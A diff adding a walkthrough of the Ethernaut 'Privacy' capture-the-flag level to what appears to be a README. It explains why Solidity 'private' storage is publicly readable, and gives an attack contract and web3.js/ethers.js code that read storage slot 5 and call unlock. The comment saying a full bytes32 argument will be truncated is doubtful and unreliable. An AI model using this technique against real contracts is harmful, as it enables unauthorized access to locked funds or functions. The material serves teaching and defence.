@@ -835,3 +835,154 @@ console.log("top:", await elevator.top()); // true
 - Cross-contract control flow and reentrancy-like logic pitfalls
 
 </details>
+
+<details>
+<summary><strong>🪙 Level 11: Privacy</strong></summary>
+
+### Overview
+
+The `Privacy` contract appears to hide sensitive data using `private` variables. In Solidity, `private` only restricts access from other contracts at compile/runtime. It does not hide data from off-chain reads. All contract storage is publicly readable on the blockchain.
+
+**Goal:** Unlock the contract by providing the correct `bytes16` key stored in `data[2]`.
+
+---
+
+### 🔓 Vulnerable Contract (simplified)
+
+<details>
+<summary><code>contract Privacy {</code></summary>
+
+```solidity
+contract Privacy {
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+}
+```
+
+</details>
+
+---
+
+### 🔍 Vulnerability Analysis
+
+- **Private ≠ hidden:** `private` only limits contract-to-contract access; storage remains public off-chain.
+- **Authorization by secret in storage:** The contract uses a value from `data[2]` as a secret key.
+- **Deterministic storage layout:** Knowing the layout lets us read the key directly.
+
+---
+
+### 🛠️ Exploitation Steps
+
+1. Determine storage slots:
+   - Slot 0: `locked`
+   - Slot 1: `ID`
+   - Slot 2: `flattening`, `denomination`, `awkwardness` (packed)
+   - Slot 3: `data[0]`
+   - Slot 4: `data[1]`
+   - Slot 5: `data[2]` ✅
+2. Read slot 5 via RPC.
+3. Cast the `bytes32` value to `bytes16` (left 16 bytes) and call `unlock(key)`.
+
+---
+
+### 📚 Detailed Explanation (Storage Layout)
+
+Solidity stores state variables in 32-byte slots sequentially. Small types are tightly packed into a single slot when possible. Arrays of fixed-length elements like `bytes32[3]` occupy consecutive whole slots.
+
+---
+
+### 🧨 Attack Contract
+
+<details>
+<summary><code>// PrivacyAttack.sol</code></summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPrivacy {
+    function unlock(bytes16 _key) external;
+}
+
+contract PrivacyAttack {
+    IPrivacy private immutable target;
+
+    constructor(address _target) {
+        target = IPrivacy(_target);
+    }
+
+    function attack(bytes32 slotValue) external {
+        bytes16 key = bytes16(slotValue); // take first 16 bytes
+        target.unlock(key);
+    }
+}
+```
+
+</details>
+
+---
+
+### 🧪 Console (read slot and unlock)
+
+<details>
+<summary><code>// web3.js</code></summary>
+
+```js
+// instance = address of Privacy level instance
+const slot5 = await web3.eth.getStorageAt(instance, 5);
+// Call unlock directly if you have the contract object
+await contract.unlock(slot5.slice(0, 34)); // first 16 bytes (0x + 32 hex chars)
+// Or send full bytes32; Solidity will truncate to bytes16
+await contract.unlock(slot5);
+```
+
+</details>
+
+<details>
+<summary><code>// ethers.js</code></summary>
+
+```js
+const slot5 = await ethers.provider.getStorageAt(instance, 5);
+const privacy = await ethers.getContractAt("Privacy", instance);
+await privacy.unlock(slot5); // bytes32 will be cast to bytes16 by the contract
+```
+
+</details>
+
+---
+
+### 🪲 Root Cause
+
+Relying on secrecy of on-chain storage for access control. On a public blockchain, storage is transparent and cannot be treated as confidential.
+
+---
+
+### 🛡️ Prevention
+
+- Never store secrets (keys/passwords) in plaintext on-chain.
+- Use commit-reveal schemes or off-chain derived values.
+- If data must be stored, store only hashes and verify preimages provided by users.
+- Educate teams that Solidity visibility modifiers do not imply privacy from observers.
+
+---
+
+### 🔗 Related Concepts
+
+- Storage layout and variable packing
+- Reading storage via `eth_getStorageAt`
+- Data confidentiality on public blockchains
+
+</details>
